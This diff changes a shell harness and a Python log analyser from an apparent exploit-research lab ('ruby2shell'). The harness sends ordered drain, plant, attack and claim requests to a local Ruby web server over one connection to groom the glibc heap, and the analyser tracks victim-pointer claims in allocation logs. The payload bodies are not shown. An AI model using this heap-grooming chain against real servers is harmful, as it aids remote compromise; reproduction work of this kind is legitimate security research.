@@ -85,6 +85,44 @@ if [ "${1:-}" = "--one" ]; then
   # embed-legal parts whose parse slices+values consume the recycled
   # 0x620/0x810-class holes so the PLANT's chunks allocate contiguously
   # from the top; the drain's own chunks stay live (sweep persistence)
+KA_MODE="${RUBY2SHELL_CLAIM_KEEPALIVE:-0}"
+if [ "$KA_MODE" = 1 ]; then
+  # One TCP connection: WEBrick/Puma serve the whole chain on one request
+  # thread, so every allocation happens in the same glibc arena.
+  KA_SPECS=("$PORT")
+  if [ -n "$DRAIN_SPEC" ] && [ -f "$PFX.drain.body" ]; then
+    KA_SPECS+=("drain:$DRAIN_ROUTE:$PFX.drain.body")
+  fi
+  if [ "${RUBY2SHELL_CLAIM_NO_PLANT:-0}" != 1 ]; then
+    KA_SPECS+=("plant:$PLANT_ROUTE:$PFX.plant.body")
+  fi
+  CHURN="${RUBY2SHELL_CLAIM_CHURN:-0}"
+  if [ "$CHURN" != 0 ] && [ -f "$PFX.churn.body" ]; then
+    for n in $(seq 1 "$CHURN"); do
+      KA_SPECS+=("churn$n:/not-a-route:$PFX.churn.body")
+    done
+  fi
+  KA_SPECS+=("attack:/not-a-route:$PFX.attack.body")
+  KA_SPECS+=("claim:/not-a-route:$PFX.claim.body")
+  if [ "${RUBY2SHELL_CLAIM_MODE:-strip}" = poison ]; then
+    KA_SPECS+=("probe:/not-a-route:$PFX.probe.body")
+  fi
+  KA_SPECS+=("up:$READY_PATH:-")
+  P0=NA; P1=NA; P2=NA; P3=NA; P4=NA; A1=NA
+  KA_OUT=$(python3 "$PWD/lab/repro/ruby2shell-keepalive-post.py" \
+    "${KA_SPECS[@]}" 2>>"$LOG")
+  rm -f "$ARM"
+  while IFS='=' read -r k v; do
+    case "$k" in
+      drain)  P0="$v" ;;
+      plant)  P1="$v" ;;
+      attack) P2="$v" ;;
+      claim)  P3="$v" ;;
+      probe)  P4="$v" ;;
+      up)     A1="$v" ;;
+    esac
+  done <<< "$KA_OUT"
+else
   P0=NA
   if [ -n "$DRAIN_SPEC" ] && [ -f "$PFX.drain.body" ]; then
     P0=$(curl -s -m 30 -X POST "http://127.0.0.1:$PORT$DRAIN_ROUTE" \
@@ -131,6 +169,7 @@ if [ "${1:-}" = "--one" ]; then
   fi
   rm -f "$ARM"
   A1=$(curl -s -m 5 "http://127.0.0.1:$PORT$READY_PATH" -o /dev/null -w '%{http_code}' 2>>"$LOG")
+fi
   ALIVE=NO
   if kill -0 "$PID" 2>/dev/null; then
     ALIVE=YES
@@ -378,8 +417,11 @@ for logf in sorted(glob.glob(f'lab/build/evidence/{os.environ["LABEL"]}-{tag}-*.
         size_a = re.search(r'size=(0x[0-9a-f]+)', as_[-1]).group(1)
     # claim pops at the victim: M or C lines with matching ptr + request
     claimed = []
-    other_pops = []
-    for l in lines:
+    bpos = max((i for i, l in enumerate(lines)
+                if l.startswith('B ')), default=-1)
+    for k, l in enumerate(lines):
+        if k <= bpos:
+            continue
         m = re.match(r'^M (\d+) ([0-9a-f]+) ([0-9a-f]+) ([0-9a-f]+)', l)
         if m and victim and ('0x' + m.group(3)) == victim:
             req = int(m.group(2), 16)
